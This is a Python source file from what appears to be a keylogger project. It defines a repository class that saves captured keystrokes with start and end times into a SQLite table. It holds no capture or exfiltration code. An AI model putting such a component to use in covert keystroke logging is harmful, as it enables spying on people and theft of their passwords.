from db.db_config import CONNECTION_URL
import sqlite3

class KeyloggerRepository:
    def __init__(self):
        self.conn = sqlite3.connect(CONNECTION_URL, check_same_thread=False)
        self.cursor = self.conn.cursor()
        
    def insert_keylog(self, keys, start_time, end_time):
        query = "INSERT INTO Keylogger (keys, start_time, end_time) VALUES (?, ?, ?)"
        self.cursor.execute(query, (keys, start_time, end_time))
        self.conn.commit()
        return True
    
    def close(self):
        self.conn.close()